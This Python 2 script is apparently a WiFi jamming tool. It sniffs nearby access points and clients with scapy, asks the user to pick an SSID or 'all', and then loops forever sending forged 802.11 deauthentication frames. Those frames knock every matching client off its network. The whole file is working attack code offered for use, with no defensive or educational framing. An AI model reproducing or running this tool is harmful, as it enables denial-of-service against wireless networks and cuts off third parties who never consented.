#!/usr/bin/env python2
import os
import nfqueue
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) #suppress warning messages from the terminal
from scapy.all import *
conf.verb = 0
from sys import exit
from subprocess import *
import sys
import socket
import fcntl

def get_interface():
    global monitor_on
    monitors, interfaces = call_iwconfig()
    if len(monitors) > 0:
        monitor_on = True
        return monitors[0]
    else:
        interface = get_iface_helper(interfaces)
        monmode = start_mon_mode(interface)
        return monmode

def call_iwconfig():
    monitors = []
    interfaces = {}
    try:
        proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
    except OSError:
        sys.exit('Could not call "iwconfig"')
    for line in proc.communicate()[0].split('\n'):
        if len(line) == 0: continue # Isn't an empty string
        if line[0] != ' ': # Doesn't start with space
            wired_search = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
            if not wired_search:
                iface = line[:line.find(' ')]
                if 'Mode:Monitor' in line:
                    monitors.append(iface)
                elif 'IEEE 802.11' in line:
                    if "ESSID:\"" in line:
                        interfaces[iface] = 1
                    else:
                        interfaces[iface] = 0
    return monitors, interfaces

def get_iface_helper(interfaces):
    scanned_aps = []
    if len(interfaces) < 1:
        sys.exit('No wireless interfaces found.')
    if len(interfaces) == 1:
        for interface in interfaces:
            return interface
        
def start_mon_mode(interface):
    print 'Starting monitor mode: '+interface
    os.system('ifconfig %s down' % interface)
    os.system('iwconfig %s mode monitor' % interface)
    os.system('ifconfig %s up' % interface)
    return interface

def get_mac_address(mon_iface):
    '''
    http://stackoverflow.com/questions/159137/getting-mac-address
    '''
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
    mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
    print 'Monitor mode: '+mon_iface+' - '+mac
    return mac

def sniff_callback(pkt):
    global clients_APs, APs

    if pkt.haslayer(Dot11):
        if pkt.addr1 and pkt.addr2:
            pkt.addr1 = pkt.addr1.lower()
            pkt.addr2 = pkt.addr2.lower()

            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                APs_add(clients_APs, APs, pkt)

            if pkt.type in [1, 2]:
                clients_APs_add(clients_APs, pkt.addr1, pkt.addr2)


def APs_add(clients_APs, APs, pkt):
    ssid       = pkt[Dot11Elt].info
    bssid      = pkt[Dot11].addr3.lower()
    try:
        ap_channel = str(ord(pkt[Dot11Elt:3].info))
        chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11']
        if ap_channel not in chans:
            return
            
    except Exception as e:
        return

    if len(APs) == 0:
        return APs.append([bssid, ap_channel, ssid])
    else:
        for b in APs:
            if bssid in b[0]:
                return
        return APs.append([bssid, ap_channel, ssid])

def clients_APs_add(clients_APs, addr1, addr2):
    if len(clients_APs) == 0:
        if len(APs) == 0:
            return clients_APs.append([addr1, addr2, monchannel])
        else:
            AP_check(addr1, addr2)

    else:
        for ca in clients_APs:
            if addr1 in ca and addr2 in ca:
                return

        if len(APs) > 0:
            return AP_check(addr1, addr2)
        else:
            return clients_APs.append([addr1, addr2, monchannel])

def AP_check(addr1, addr2):
    for ap in APs:
        if ap[0].lower() in addr1.lower() or ap[0].lower() in addr2.lower():
            return clients_APs.append([addr1, addr2, ap[1], ap[2]])

def get_unique_ssids():
	for i in APs:
		if i[2] not in unique_ssids:
			unique_ssids[i[2]] = 0
	
	for i in clients_APs:
		if len(i)==4 and i[3] in unique_ssids:
			unique_ssids[i[3]] += 1
	
	for i in unique_ssids:
		print "SSID:" + str(i) + "    Number of Clients:" + str(unique_ssids[i])

def deauth(ssid):
    '''
    addr1=destination, addr2=source, addr3=bssid, addr4=bssid
    '''
    pkts = []

    if len(clients_APs) > 0:
        for x in clients_APs:
            client = x[0]
            ap = x[1]
            ch = x[2]
            if (len(x)==4 and ssid == x[3]) or ssid == "all":
                deauth_pkt1 = Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
                deauth_pkt2 = Dot11(addr1=ap, addr2=client, addr3=client) / Dot11Deauth()
                pkts.append(deauth_pkt1)
                pkts.append(deauth_pkt2)
    if len(APs) > 0:
        for a in APs:
            ap = a[0]
            ch = a[1]
            if ssid == a[2] or ssid == "all":
                deauth_ap = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=ap, addr3=ap) / Dot11Deauth()
                pkts.append(deauth_ap)
    if len(pkts) > 0:
        for p in pkts:
            send(p, inter=float(0), count=1)

if __name__ == "__main__":
    clients_APs = []
    APs = []
    monchannel = 0
    unique_ssids = {}
    DN = open(os.devnull, 'w')
    monitor_on = None
    mon_iface = get_interface()
    conf.iface = mon_iface
    mac_address = get_mac_address(mon_iface)
    scan_time = int(raw_input('Enter the amount of time for scanning attack targets: '))
    sniff(iface=mon_iface,prn=sniff_callback,timeout = scan_time)
    get_unique_ssids()
    target = raw_input("Enter the SSID of the network that you would like to jam. Enter \'all\' to jam all networks:")
    while (target not in unique_ssids) and (target != "all"):
		target = raw_input("Could not find the SSID just entered. Please enter again:")
    if target != "all":
        print "Jamming network: "+ target
    else:
		print "Jamming all networks..."
    while True:
        deauth(target)
        
    
